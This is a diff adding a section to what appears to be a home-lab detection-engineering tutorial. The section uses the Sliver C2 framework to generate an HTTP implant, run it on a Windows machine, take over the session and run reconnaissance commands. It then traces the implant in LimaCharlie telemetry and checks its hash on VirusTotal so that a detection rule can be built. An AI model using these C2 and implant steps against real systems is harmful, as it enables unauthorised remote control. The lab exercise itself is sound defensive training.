@@ -78,6 +78,71 @@ Sigma is a detection rule format, enabling rules to identify malicious behavior.
 
 <add image>
 
+-Configuring the Virtual Machine (Linux)
 
+<add image>
+      
+sudo su – enable the device as superuser.
 
+systemctl status sliver – check if Sliver is active.
 
+<add image>
+
+– Sliver
+Sliver is an open-source command-and-control (C2) framework developed by BishopFox, designed for Red Team operations, penetration testing, and adversary simulation. It serves as a modern alternative to tools such as Cobalt Strike and Metasploit, offering support for multiple platforms and secure communication.
+Here’s the translation:
+
+<add image>
+
+http – check if the machine is “listening” for possible connections.
+
+jobs – check if the machine has any active processes.
+
+Generating our C2 implant
+It is a payload that enables attackers to remotely control a compromised device, through C2 (command and control).
+<add image>
+
+generate –http <linux_vm_ip> –save /var/www/payloads 
+<add image>
+
+– Accessing the file through Windows
+<add image>
+
+– On the Linux machine
+<add image>
+
+use [session_id] – replace session_id with the number shown in the image above (in this case bc318fc1).
+<add image>
+
+info – simple command to gather information such as machine name, malware name, system type, and language location
+<add image>
+
+whoami: basically a “who am I” in Linux — in this specific case, it shows the machine name and its escalation.
+
+pwd: shows the directory path — in this case C:\Users\Administrator\Downloads.
+
+netstat: displays the connections currently occurring on the remote system.
+
+ps -T: identifies the processes running on the remote system in a “tree” format.
+
+– Going back to the Sensors part
+
+rocesses in the LimaCharlie section – shows the processes running in the LimaCharlie environment.
+
+Now that a “suspicious” process has been found: MARKED_REVIEW.exe
+
+Connection established with the program MARKED_REVIEW.exe, including the base connection and the destination.
+
+Next, following the line of “viewing network connections.”
+
+Network – list of connections made, including connections between suspicious files.
+
+File System – lists the files on the computer, allowing an easy path to locate them.
+
+Scan on VirusTotal to check if there is any process similar or identical, to see if there is a solution for a potential old or documented malware.
+
+Hash – ba39c9077470488fed6f7bd37f9539010d6c5b852bb658309b98116edcaf326c
+
+Since in this case there is no match, a new detection and response rule needs to be created.
+
+Telemetry – real-time data collection and analysis, enabling the creation of defense and detection rules.
